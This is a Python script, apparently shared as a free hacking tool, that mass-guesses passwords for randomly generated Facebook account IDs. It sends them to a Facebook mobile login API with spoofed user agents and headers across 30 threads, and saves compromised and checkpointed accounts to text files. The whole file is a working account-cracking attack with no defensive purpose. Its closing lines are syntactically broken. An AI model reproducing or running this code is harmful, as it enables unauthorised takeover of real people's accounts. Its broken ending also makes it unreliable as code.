
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'



import os
import os, sys
try:
	import requests
except ImportError:
	os.system("pip install requests")
#Rihab Bhao
try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
#Rihab Bhao

def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		#Rihab Bhao
		print ("""\033[1;92m   
███████╗██╗  ██╗██╗███████╗██╗  ██╗██╗██████╗ 
██╔════╝██║  ██║██║██╔════╝██║  ██║██║██╔══██╗
███████╗███████║██║███████╗███████║██║██████╔╝
╚════██║██╔══██║██║╚════██║██╔══██║██║██╔══██╗
███████║██║  ██║██║███████║██║  ██║██║██║  ██║
╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
                                              
\033[1;91m [\033[1;94mâœ¯\033[1;91m] \033[1;92mFACEBOOK : MD Sopnomoy Sobuj
\033[1;91m [\033[1;94mâœ¯\033[1;91m] \033[1;92mFB PAGE  : Rihab Bhao
\033[1;91m [\033[1;94mâœ¯\033[1;91m] \033[1;92mGITHUB   : Rihab Bhao
\033[1;91m [\033[1;94mâœ¯\033[1;91m] \033[1;92mWARNING  : FUCK🖕Rihab Bhao–•
\033[1;90m
    """)
		print("%s [%sâ€¢%s] %sTOOL NAME : %s🌺Old Fb Cracker💮"%(G,R,G,B,G))
		print("%s [%sâ€¢%s] %sVERSION   : %s1.3"%(G,R,G,B,G))
		print("")
		print("\n    \033[0;92m            FUCK–• DARK CYBER\033[0;97m ")
		print("\n    \033[0;92m            LOVE MY SUPPORTER🌺\033[0;97m ")
		print("%s [%s--s--%s]%s CRACK---RANDOM---FB---ID--- 2008-11 %s(💮Free🌺)"%(G,R,G,Y,B))
		allah = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
		if allah in ["", " "]:
			Main()
		elif allah in ["s", "01"]:
			self.dark()
		else:
			Main()
#FUCK DARK CYBER
	def dark(self):
		r = 111111111
		rr = 999999999
		mmm = "100000" 
		limit = int(input("\x1b[1;93m [+] ENTER LIMIT \x1b[1;92m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(r,rr)
				__ = mmm
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> on.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> off.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n    [#] CRACK COMPLETE...")
		except Exception as e:exit(str(e))
#Hack
	def api(self, uid, pwx):
		ua = random.choice(["Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;","Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;","Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36 Edg/99.0.1150.36","Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36","Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefoxversion","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0","Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41","Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00","Opera/9.60 (Windows NT 6.0; U; en) Presto/2.1.1","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"])
		sys.stdout.write(
			"\r\r %s[>_] [Hack] : %s/%s -> \033[0;92m [ ON:%s ]- \033[0;91m[OFF:%s]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \x1b[1;91m   [💮ON] %s | %s\033[0;90m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("on.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \x1b[1;91m   [🥵OFF🥵] %s | %s\x1b[1;96m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("off.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue
#Hack
		self.loop +=1

if len(sys.argv) == 2:
	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
		helpnote()
	else:
		Main()
		#FUCK DARK CYBER

try:Main()
except Exception as e:exit(str(e))
    __import__("dm").prodan()
except Exception as e:
    exit(str(e))
